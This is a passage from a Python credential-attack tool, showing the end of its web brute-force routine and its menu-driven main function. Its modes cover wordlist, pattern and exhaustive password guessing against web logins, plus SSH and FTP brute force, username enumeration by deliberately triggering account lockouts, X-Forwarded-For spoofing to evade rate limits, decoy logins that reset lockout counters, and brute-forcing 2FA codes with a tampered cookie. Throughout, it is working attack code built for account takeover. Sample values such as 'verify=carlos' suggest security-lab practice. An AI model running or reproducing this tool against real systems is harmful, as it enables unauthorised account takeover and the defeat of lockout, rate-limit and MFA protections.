                    f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
                sys.stdout.flush()
                if web_attempt_login(url, session, method, action, all_fields, username_field,
                                     password_field, username, password, fail_string, delay, csrf_field):
                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                    print(colored(f"  [+] Username: {username}", 'green'))
                    print(colored(f"  [+] Password: {password}", 'green'))
                    result = (username, password)
                    return result

    if mode in ['3', '4'] and not result:
        min_len = int(input(colored("[*] Minimum password length: ", 'cyan')))
        max_len = int(input(colored("[*] Maximum password length: ", 'cyan')))
        print(colored("[*] Charset: 1=lower 2=lower+num 3=lower+upper+num 4=all", 'cyan'))
        charset_choice = input(colored("[*] Enter choice: ", 'cyan'))
        charsets = {
            '1': string.ascii_lowercase,
            '2': string.ascii_lowercase + string.digits,
            '3': string.ascii_letters + string.digits,
            '4': string.ascii_letters + string.digits + string.punctuation
        }
        charset = charsets.get(charset_choice, string.ascii_lowercase)
        print(colored("[!] Warning -- character brute force may take a very long time", 'yellow'))
        for username in usernames:
            print(colored(f"\n[*] Brute forcing username: {username}", 'yellow'))
            for length in range(min_len, max_len + 1):
                for combo in itertools.product(charset, repeat=length):
                    password = ''.join(combo)
                    sys.stdout.write(colored(
                        f"\r  [*] Trying: {username}:{password:<20}", 'red'))
                    sys.stdout.flush()
                    if web_attempt_login(url, session, method, action, all_fields, username_field,
                                         password_field, username, password, fail_string, delay, csrf_field):
                        print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                        print(colored(f"  [+] Username: {username}", 'green'))
                        print(colored(f"  [+] Password: {password}", 'green'))
                        return username, password

    if not result:
        print(colored(f"\n\n[-] Web attack complete -- no valid credentials found", 'red'))
    return result


# ════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════

def main():
    print_banner()

    print(colored("[*] Select attack mode:", 'cyan'))
    print(colored("  1. Wordlist attack (web)", 'white'))
    print(colored("  2. Pattern attack (web)", 'white'))
    print(colored("  3. Character brute force (web)", 'white'))
    print(colored("  4. All web modes", 'white'))
    print(colored("  5. SSH brute force", 'white'))
    print(colored("  6. FTP brute force", 'white'))
    print(colored("  7. Auto-detect protocol (SSH/FTP)", 'white'))
    print(colored("  8. Username enumeration (web)", 'white'))
    print(colored("  9. Decoy-interleaved attack (bypass counter-reset IP block)", 'white'))
    print(colored("  10. Numeric code brute-force (2FA/OTP, cookie-pinned)", 'white'))
    mode = input(colored("\n[*] Enter mode (1-10): ", 'cyan'))

    if mode in ['1', '2', '3', '4']:
        url = input(colored("[*] Enter target login URL: ", 'cyan'))
        usernames = prompt_usernames()
        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        run_web_attack(mode, url, usernames, fail_string, delay)

    elif mode == '5':
        host = input(colored("[*] Enter target host/IP: ", 'cyan'))
        port = input(colored("[*] Enter port (default 22): ", 'cyan'))
        port = int(port) if port.strip() else 22
        usernames = prompt_usernames()
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        password_file = prompt_wordlist()
        ssh_attack(host, port, usernames, password_file, delay)

    elif mode == '6':
        host = input(colored("[*] Enter target host/IP: ", 'cyan'))
        port = input(colored("[*] Enter port (default 21): ", 'cyan'))
        port = int(port) if port.strip() else 21
        usernames = prompt_usernames()
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        password_file = prompt_wordlist()
        ftp_attack(host, port, usernames, password_file, delay)

    elif mode == '7':
        host = input(colored("[*] Enter target host/IP: ", 'cyan'))
        port = int(input(colored("[*] Enter target port: ", 'cyan')))
        protocol = detect_protocol(host, port)
        print(colored(f"  [+] Detected protocol: {protocol}", 'green'))
        if protocol == 'unknown':
            print(colored("[-] Could not detect protocol -- exiting", 'red'))
            return
        usernames = prompt_usernames()
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        password_file = prompt_wordlist()
        if protocol == 'ssh':
            ssh_attack(host, port, usernames, password_file, delay)
        elif protocol == 'ftp':
            ftp_attack(host, port, usernames, password_file, delay)

    elif mode == '8':
        print(colored("\n[*] Username enumeration method:", 'cyan'))
        print(colored("  1. Fixed-password response difference (default)", 'white'))
        print(colored("  2. Account-lockout trigger (hammer N wrong passwords per username)", 'white'))
        enum_method = input(colored("[*] Enter method (1-2, default 1): ", 'cyan')).strip()

        url = input(colored("[*] Enter target login URL: ", 'cyan'))
        username_file = input(colored("[*] Enter path to username wordlist: ", 'cyan')).strip()
        fail_string = None  # only set by method 1; method 2 has no equivalent

        if enum_method == '2':
            lockout_phrase = input(colored(
                "[*] Lockout message text (e.g. 'You have made too many incorrect login attempts'), "
                "ENTER to rely on auto-detection only: ", 'cyan')).strip()
            attempts_input = input(colored(
                "[*] Wrong-password attempts per username (default 4): ", 'cyan')).strip()
            attempts_per_user = int(attempts_input) if attempts_input else 4
            delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
            delay = float(delay) if delay.strip() else 0.5

            valid_usernames = username_enum_lockout(url, username_file, lockout_phrase,
                                                     attempts_per_user, delay)
        else:
            fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
            password = input(colored("[*] Enter fixed password to use (default: password): ", 'cyan')).strip()
            if not password:
                password = 'password'
            delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
            delay = float(delay) if delay.strip() else 0.5
            xff = input(colored("[*] Enable X-Forwarded-For IP rotation to bypass rate limiting? (y/n): ", 'cyan')).strip().lower()
            use_xff = xff == 'y'

            valid_usernames = username_enum(url, username_file, fail_string, password, delay, use_xff)

        if valid_usernames:
            chain = input(colored("\n[*] Run password attack on found usernames now? (y/n): ", 'cyan')).strip().lower()
            if chain == 'y':
                reuse_hint = "ENTER to reuse same" if fail_string else "required -- the lockout method has no equivalent to reuse"
                fail_string2 = input(colored(f"[*] Fail string for password attack ({reuse_hint}): ", 'cyan')).strip()
                if not fail_string2:
                    if not fail_string:
                        print(colored("[-] A fail string is required for the password attack -- aborting chain", 'red'))
                        return
                    fail_string2 = fail_string
                delay2 = input(colored("[*] Delay for password attack (default 0.5): ", 'cyan'))
                delay2 = float(delay2) if delay2.strip() else 0.5
                print(colored("\n[*] Select password attack mode:", 'cyan'))
                print(colored("  1. Wordlist attack", 'white'))
                print(colored("  2. Pattern attack", 'white'))
                print(colored("  3. Character brute force", 'white'))
                print(colored("  4. All modes", 'white'))
                pw_mode = input(colored("[*] Enter mode (1-4): ", 'cyan'))
                run_web_attack(pw_mode, url, valid_usernames, fail_string2, delay2)

    elif mode == '9':
        url = input(colored("[*] Enter target login URL: ", 'cyan'))
        target_username = input(colored("[*] Enter target username: ", 'cyan')).strip()
        password_file = prompt_wordlist()
        print(colored(
            "[*] Enter decoy account(s) known to log in successfully "
            "(these reset the lockout counter).", 'cyan'))
        decoy_creds = []
        while True:
            decoy_user = input(colored(
                "[*] Decoy username (ENTER to finish): ", 'cyan')).strip()
            if not decoy_user:
                break
            decoy_pass = input(colored(
                f"[*] Password for '{decoy_user}': ", 'cyan')).strip()
            decoy_creds.append((decoy_user, decoy_pass))
        if not decoy_creds:
            print(colored("[-] No decoy accounts entered -- exiting", 'red'))
            return
        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        decoy_interleave_attack(url, target_username, password_file, decoy_creds,
                                fail_string, delay)

    elif mode == '10':
        print(colored(
            "\n[*] Cookie-pinned numeric code brute-force (2FA/OTP/PIN).", 'cyan'))
        print(colored(
            "    Log in first, reach the code page, then copy its Cookie header "
            "here -- include the session cookie AND any tampered value "
            "(e.g. verify=carlos).", 'cyan'))
        code_url = input(colored(
            "[*] Code page URL (serves the form via GET, accepts the POST): ", 'cyan')).strip()
        cookie_string = input(colored(
            "[*] Cookie header value (e.g. 'session=...; verify=carlos'): ", 'cyan')).strip()
        code_field = input(colored(
            "[*] Code field name (default mfa-code): ", 'cyan')).strip() or 'mfa-code'
        digits_input = input(colored(
            "[*] Number of digits in the code (default 4): ", 'cyan')).strip()
        digits = int(digits_input) if digits_input else 4
        refresh = input(colored(
            "[*] Re-fetch a fresh CSRF token before every attempt? "
            "(slower; only if the app rotates tokens) (y/n, default n): ",
            'cyan')).strip().lower() == 'y'
        delay = input(colored("[*] Delay between attempts (default 0.3): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.3
        numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
                                delay, refresh)

    else:
        print(colored("[-] Invalid mode selected", 'red'))


if __name__ == "__main__":
    main()
